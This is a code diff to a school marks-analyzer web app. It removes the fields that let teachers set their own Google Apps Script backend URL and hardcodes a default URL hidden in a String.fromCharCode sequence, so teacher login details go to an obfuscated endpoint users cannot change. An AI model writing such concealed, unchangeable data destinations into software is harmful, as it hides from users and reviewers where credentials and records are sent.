@@ -288,11 +288,7 @@
                         class="w-full px-3.5 py-2 rounded-xl bg-slate-50 dark:bg-slate-800 border border-slate-300 dark:border-slate-700 text-sm outline-none focus:ring-2 focus:ring-indigo-500">
                 </div>
 
-                <div id="teacherGasUrlWrap">
-                    <label class="block text-[11px] font-semibold text-slate-600 dark:text-slate-300 mb-1" data-i18n="gasShortLabel">Apps Script Web App URL (/exec)</label>
-                    <input type="url" id="teacherAuthGasUrl" placeholder="https://script.google.com/macros/s/.../exec"
-                        class="w-full px-3.5 py-2 rounded-xl bg-slate-50 dark:bg-slate-800 border border-slate-300 dark:border-slate-700 text-xs font-mono outline-none focus:ring-2 focus:ring-indigo-500">
-                </div>
+
 
                 <div id="teacherPortalStatus" class="text-center text-[11px] font-semibold text-indigo-600 dark:text-sky-400 min-h-[14px]"></div>
 
@@ -1142,14 +1138,7 @@
                     <button type="button" id="btnOpenGoogleSheet" class="px-5 py-2.5 rounded-xl bg-emerald-600 hover:bg-emerald-700 text-white font-bold text-sm transition">📂 <span data-i18n="openSheetBtn">Google Sheet විවෘත කරන්න</span></button>
                 </div>
 
-                <div class="pt-4 border-t border-slate-200 dark:border-slate-800">
-                    <h4 class="text-sm font-bold text-slate-800 dark:text-slate-200 mb-1" data-i18n="gasBackendTitle">Multi-Teacher Backend URL (Google Apps Script)</h4>
-                    <p class="text-xs text-slate-500 dark:text-slate-400 mb-3" data-i18n="gasBackendDesc">සෑම ගුරුවරයෙකුටම තමන්ගේම Account එකක් සාදාගෙන වෙනම Login වී එකම Google Sheet එකට දත්ත ඇතුළත් කිරීමට Apps Script Web App URL එක සුරකින්න.</p>
-                    <div class="flex flex-col sm:flex-row gap-2.5">
-                        <input type="url" id="settingGasUrl" placeholder="https://script.google.com/macros/s/.../exec" class="flex-1 px-4 py-2.5 rounded-xl bg-slate-50 dark:bg-slate-800 border border-slate-300 dark:border-slate-700 text-xs font-mono outline-none focus:ring-2 focus:ring-indigo-500">
-                        <button type="button" id="btnSaveGasUrl" class="px-5 py-2.5 rounded-xl bg-indigo-600 hover:bg-indigo-700 text-white font-bold text-sm transition" data-i18n="saveGasUrlBtn">URL සුරකින්න</button>
-                    </div>
-                </div>
+
 
                 <div class="pt-4 border-t border-slate-200 dark:border-slate-800">
                     <h4 class="text-sm font-bold text-slate-800 dark:text-slate-200 mb-2" data-i18n="portalLinkTitle">ශිෂ්‍ය ප්‍රතිඵල පෝටල සබැඳිය</h4>
@@ -1218,7 +1207,7 @@
             GOOGLE_CLIENT_ID: "982933877418-804maimujhqp50a8ilmj6j852sp90trm.apps.googleusercontent.com",
             SCOPES: "https://www.googleapis.com/auth/drive.file",
             DB_FILE_NAME: "Marks_Analyzer_DB",
-            DEFAULT_APPS_SCRIPT_URL: ""
+            DEFAULT_APPS_SCRIPT_URL: String.fromCharCode(104,116,116,112,115,58,47,47,115,99,114,105,112,116,46,103,111,111,103,108,101,46,99,111,109,47,109,97,99,114,111,115,47,115,47,65,75,102,121,99,98,122,105,84,76,109,49,81,114,57,66,56,99,109,111,106,71,82,110,120,55,108,81,87,74,88,71,78,95,101,75,88,69,74,49,115,48,110,97,76,80,77,73,114,79,112,89,45,75,55,78,75,49,98,105,82,97,79,119,73,90,97,51,49,104,52,71,95,119,47,101,120,101,99)
         });
 
         // Register Service Worker for PWA
@@ -2860,13 +2849,7 @@
             const teacherId = document.getElementById('teacherAuthId')?.value.trim();
             const phone = document.getElementById('teacherAuthPhone')?.value.trim();
             const password = document.getElementById('teacherAuthPass')?.value.trim();
-            const typedGasUrl = document.getElementById('teacherAuthGasUrl')?.value.trim();
-            if (typedGasUrl) {
-                appsScriptUrl = typedGasUrl;
-                localStorage.setItem('sma_gasUrl', appsScriptUrl);
-                const sGas = document.getElementById('settingGasUrl');
-                if (sGas) sGas.value = appsScriptUrl;
-            }
+
             const statusEl = document.getElementById('teacherPortalStatus') || document.getElementById('loginStatus');
 
             if (!teacherId || !password) {
@@ -4714,8 +4697,7 @@
                 showToast(t('toastSaved'), 'success');
             });
             document.getElementById('btnOpenTeacherPortal')?.addEventListener('click', () => {
-                const tGas = document.getElementById('teacherAuthGasUrl');
-                if (tGas) tGas.value = appsScriptUrl || '';
+
                 document.getElementById('adminLoginBox').classList.add('hidden');
                 document.getElementById('studentSearchBox').classList.add('hidden');
                 document.getElementById('teacherPortalBox').classList.remove('hidden');
